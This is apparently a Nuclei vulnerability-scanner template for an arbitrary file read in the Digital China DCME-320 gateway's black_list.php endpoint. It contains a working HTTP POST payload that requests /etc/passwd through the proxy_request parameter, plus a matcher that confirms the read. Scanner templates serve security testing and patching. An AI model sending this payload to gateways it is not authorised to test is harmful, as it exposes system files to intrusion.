id: digitalchina-DCME-black_list_php-File-reading

info:
  name: 神州数码 DCME-320出口网关 black_list.php 任意文件读取
  author: HuanXiong
  severity: high

  tags: File Reading

http:
  - raw:
      - |-
        POST /function/auth/user/black_list.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 25

        proxy_request=/etc/passwd

    matchers:
      - type: dsl
        name: 任意文件读取
        dsl:
          - "status_code==200 && contains_all(body,'sbin','root:x')"
